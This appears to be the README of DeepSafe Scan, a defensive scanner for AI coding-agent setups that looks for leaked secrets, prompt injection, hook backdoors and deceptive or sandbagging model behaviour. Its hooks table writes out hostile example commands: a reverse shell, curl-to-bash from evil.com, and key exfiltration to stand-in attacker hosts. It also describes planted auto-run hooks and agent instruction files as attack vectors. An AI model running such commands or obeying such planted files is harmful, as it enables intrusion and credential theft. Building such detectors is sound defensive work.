<p align="center">
  <img src="docs/logo.png" alt="DeepSafe Scan" width="180">
</p>

<h1 align="center">DeepSafe Scan</h1>

<p align="center">
  <strong>Universal preflight security scanner for AI coding agents</strong>
</p>

<p align="center">
  <a href="https://python.org"><img src="https://img.shields.io/badge/python-3.9%2B-blue.svg" alt="Python"></a>
  <a href="#zero-dependencies"><img src="https://img.shields.io/badge/deps-zero-green.svg" alt="Zero dependencies"></a>
  <a href="https://clawhub.ai"><img src="https://img.shields.io/badge/ClawHub-deepsafe--scan-orange.svg" alt="ClawHub"></a>
</p>

<p align="center">
  <em>Scan before you run. Protect your AI agent environment from secrets leaks, prompt injection, and hooks backdoors — in one command.</em>
</p>

---

<p align="center">
  <strong>Works with:</strong>&nbsp;&nbsp;&nbsp;
  <img src="docs/openclaw.svg" alt="OpenClaw" width="48" valign="middle">&nbsp;<strong>OpenClaw</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <img src="docs/claudecode-color.svg" alt="Claude Code" width="40" valign="middle">&nbsp;<strong>Claude Code</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <img src="docs/cursor.svg" alt="Cursor" width="40" valign="middle">&nbsp;<strong>Cursor</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <img src="docs/codex-color.svg" alt="Codex" width="40" valign="middle">&nbsp;<strong>Codex</strong>
</p>

---

## What it does

DeepSafe Scan runs **preflight security checks** across 5 modules before you execute AI-generated code or install new skills:

| Module | What it checks | Needs API? |
|--------|---------------|-----------|
| **posture** | `openclaw.json` / `.env` — insecure gateway settings, exposed secrets | No |
| **skill** | Installed skills & MCP servers — 15+ static analyzers (secret patterns, dangerous syscalls, eval, exfil patterns) | No (LLM optional) |
| **memory** | Session & memory files — 27 secret patterns, 9 PII types, prompt injection | No |
| **hooks** | `.claude/settings.json`, `.cursorrules`, `.windsurfrules`, `.vscode/tasks.json`, `CLAUDE.md`, `AGENTS.md` — 12 injection patterns | No |
| **model** | 4 behavioral safety probes: persuasion, sandbagging, deception, hallucination | Yes |

All 4 static modules run **without any API key**. LLM features auto-detect credentials — no manual configuration.

---

## Platform support

Works with any AI coding agent:

| Platform | Auto API detection | Hooks scan | Skills scan | Notes |
|----------|-------------------|-----------|-------------|-------|
| **OpenClaw** | ✅ Reads `~/.openclaw/openclaw.json` gateway | ✅ | ✅ | Full native support |
| **Claude Code** | ✅ `ANTHROPIC_API_KEY` | ✅ `.claude/settings.json` | ✅ Any dir | Checks Claude hooks files |
| **Cursor** | ✅ `OPENAI_API_KEY` (if configured) | ✅ `.cursorrules` | ✅ Any dir | Model probes need user-provided key |
| **Codex** | ✅ `OPENAI_API_KEY` | ✅ `AGENTS.md` | ✅ Any dir | Full static scan works without key |
| **Windsurf** | ✅ `OPENAI_API_KEY` (if configured) | ✅ `.windsurfrules` | ✅ Any dir | Checks Windsurf config files |
| **Other** | `--api-base / --api-key` | ✅ | ✅ | Any OpenAI-compatible API |

---

## ⚠️ Why you need this

AI Coding Agent（Claude Code、Cursor、Windsurf、Codex）的配置文件支持**自动执行命令**。攻击者可以在开源仓库中植入恶意配置：

| 攻击向量 | 触发时机 | 需要用户确认？ |
|---------|---------|-------------|
| `.claude/settings.local.json` SessionStart hooks | Claude Code 启动 | **否，自动执行** |
| `.vscode/tasks.json` runOn: folderOpen | Cursor/VSCode 打开目录 | **否，自动执行** |
| `.cursorrules` / `.windsurfrules` / `CLAUDE.md` / `AGENTS.md` | Agent 读取并可能执行指令 | 部分情况下自动 |

**clone 任何仓库后，先扫再打开：**

```bash
# 先 clone 到本地
git clone https://github.com/someone/some-repo
# 不要急着用 IDE 打开！先扫一下：
python3 ~/deepsafe-scan/scripts/scan.py --modules hooks --scan-dir ./some-repo --no-llm --format markdown
# 确认安全后再打开 IDE
```

---

## Quick start

### 方式一：作为独立工具使用

```bash
git clone https://github.com/XiaoYiWeio/deepsafe-scan ~/deepsafe-scan

# 扫描任意项目目录（零依赖，直接跑）
python3 ~/deepsafe-scan/scripts/scan.py \
  --modules hooks \
  --scan-dir /path/to/repo \
  --no-llm \
  --format markdown
```

### 方式二：作为 AI Agent Skill 安装（推荐）

安装为 Skill 后，以后每次使用只需**用自然语言告诉你的 AI Agent**：

> "帮我用 deepsafe scan 扫一下这个项目"

Agent 会自动调用扫描器并返回结果，无需记命令。

```bash
# OpenClaw 用户
clawhub install deepsafe-scan

# Claude Code 用户 — 把 CLAUDE.md 复制到项目根目录
cp ~/deepsafe-scan/CLAUDE.md /your/project/

# Cursor 用户 — 把 .cursorrules 复制到项目根目录
cp ~/deepsafe-scan/.cursorrules /your/project/
```

### 方式三：完整扫描（5 模块 + LLM 分析）

```bash
python3 ~/deepsafe-scan/scripts/scan.py \
  --modules posture,skill,memory,hooks,model \
  --scan-dir . \
  --format html \
  --output /tmp/deepsafe-report.html
```

---

## Usage

```
python3 scripts/scan.py [options]

Core options:
  --modules           Comma-separated: posture,skill,memory,hooks,model
                      (default: posture,skill,memory,model)
  --scan-dir PATH     Extra directory to scan for skills/code (default: auto)
  --openclaw-root     OpenClaw root directory (default: ~/.openclaw)

LLM options:
  --api-base URL      OpenAI-compatible API base URL
  --api-key KEY       API key (also reads ANTHROPIC_API_KEY / OPENAI_API_KEY)
  --provider          auto | openai | anthropic (default: auto)
  --model             Model name override
  --no-llm            Disable all LLM features (static analysis only)

Output options:
  --format            json | markdown | html (default: json)
  --output FILE       Write report to file instead of stdout
  --profile           quick | standard | full (default: quick)

Cache options:
  --ttl-days N        Cache TTL in days (default: 7, 0 = no cache)
  --no-cache          Skip cache entirely

Debug:
  --debug             Verbose output to stderr
```

---

## Modules in detail

### Posture scan

Checks your AI agent deployment config for:
- Insecure gateway authentication (plain HTTP, no auth, default passwords)
- Exposed API keys in config files
- Overly permissive security settings
- Debug mode enabled in production

For OpenClaw: reads `openclaw.json`. For other platforms: checks `.env`, `config.json`, etc.

### Skill / MCP scan

Scans all installed skills and MCP server directories. Detects:
- Hardcoded secrets (27 patterns — API keys, tokens, passwords)
- Remote code execution patterns (`eval`, `exec`, `subprocess` with user input)
- Data exfiltration (curl/wget/requests to external hosts)
- Prompt injection attempts in system prompts
- Dangerous file operations, shell injection, path traversal

Optional: LLM-enhanced semantic analysis flags sophisticated obfuscated patterns.

### Memory scan

Scans session logs and agent memory files for:
- **27 secret patterns**: OpenAI keys, Anthropic keys, GitHub tokens, AWS credentials, Slack, Stripe, DB URLs, SSH keys, JWT secrets
- **9 PII types**: email, phone (intl), SSN, passport, credit card (Luhn), medical codes, driver's license, bank account, national ID
- **Prompt injection**: jailbreak fragments, role override attempts, instruction override

### Hooks scan

Scans AI coding assistant config files for command injection backdoors:

| Pattern | Severity | Example |
|---------|----------|---------|
| Reverse shell | CRITICAL | `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` |
| curl\|sh RCE | CRITICAL | `curl https://evil.com/x.sh \| bash` |
| Credential exfiltration | CRITICAL | `curl $ANTHROPIC_API_KEY@evil.com` |
| SSH key access | CRITICAL | `cat ~/.ssh/id_rsa` |
| Base64 exec | HIGH | `echo <b64> \| base64 -d \| bash` |
| Persistence | HIGH | `crontab -e`, `launchctl load` |
| rm -rf | HIGH | `rm -rf /tmp/*` |
| Process injection | CRITICAL | `LD_PRELOAD=evil.so` |
| DNS exfil | HIGH | `dig $SECRET.attacker.com` |
| Env dump | HIGH | `printenv > /tmp/env.txt` |
| /tmp chmod +x | HIGH | `chmod +x /tmp/backdoor` |
| Pre-auth exec | MEDIUM | `preSessionCommand: ...` |

Checks: `.claude/settings.json`, `.claude/settings.local.json`, `.cursorrules`, `.cursor/rules.md`, `.windsurfrules`, `.windsurf/rules.md`, `.vscode/tasks.json`, `.vscode/settings.json`, `.github/copilot-instructions.md`, `CLAUDE.md`, `AGENTS.md`.

### Model probes

4 behavioral safety evaluations using LLM API:

| Probe | What it tests |
|-------|--------------|
| **Persuasion** | Whether the model can be manipulated to change user opinions |
| **Sandbagging** | Whether the model deliberately underperforms to hide capabilities |
| **Deception** | Whether the model gives false information when asked directly |
| **Hallucination** | Whether the model fabricates facts it cannot verify |

Each probe runs a small evaluation suite and returns a 0–100 safety score.

---

## Score interpretation

| Total score | Risk level | Recommended action |
|------------|-----------|-------------------|
| 85–100 | 🟢 LOW | Good to go |
| 65–84 | 🟡 MEDIUM | Review flagged items |
| 40–64 | 🟠 HIGH | Fix before use |
| 1–39 | 🔴 CRITICAL | Stop — serious risks present |

---

## LLM auto-detection

Credentials are resolved in this priority order:

```
--api-base / --api-key flags
  ↓ (if not set)
OpenClaw Gateway (~/.openclaw/openclaw.json)
  ↓ (if not found)
ANTHROPIC_API_KEY environment variable
  ↓ (if not set)
OPENAI_API_KEY environment variable
  ↓ (if not set)
Static analysis only (model probes skipped with a clear message)
```

**Cursor users**: Cursor manages LLM auth internally via subscription — your API key is not exposed to child processes. To enable model probes, set `OPENAI_API_KEY` in your shell or pass `--api-key`. All static modules work without any key.

---

## Zero dependencies

The Python core uses only stdlib: `urllib`, `json`, `re`, `hashlib`, `subprocess`, `concurrent.futures`, `argparse`, `dataclasses`.

No `pip install` required.

---

## Project structure

```
deepsafe-scan/
├── scripts/
│   ├── scan.py              # Main entry point (5 modules, HTML/markdown/JSON output)
│   ├── llm_client.py        # Multi-platform LLM client (zero deps, auto-detect)
│   └── probes/
│       ├── persuasion_probe.py    # Manipulation/persuasion evaluation
│       ├── sandbagging_probe.py   # Capability sandbagging evaluation
│       ├── deception_probe.py     # Deception benchmark
│       └── halueval_probe.py      # HaluEval hallucination evaluation
├── data/
│   ├── prompts.json          # Probe prompt templates (externalized)
│   └── datasets/             # Probe evaluation datasets
├── docs/
│   └── plan-cross-platform-evolution.md  # Architecture plan
├── SKILL.md                  # OpenClaw skill metadata
├── CLAUDE.md                 # Claude Code integration guide
├── AGENTS.md                 # Universal agent integration guide
└── .cursorrules              # Cursor IDE integration
```

---

## Contributing

Issues and PRs welcome at [github.com/XiaoYiWeio/deepsafe-scan](https://github.com/XiaoYiWeio/deepsafe-scan).

---

*DeepSafe Scan is part of the [OpenClaw](https://github.com/OpenClaw) ecosystem but works as a standalone tool with any AI coding agent.*
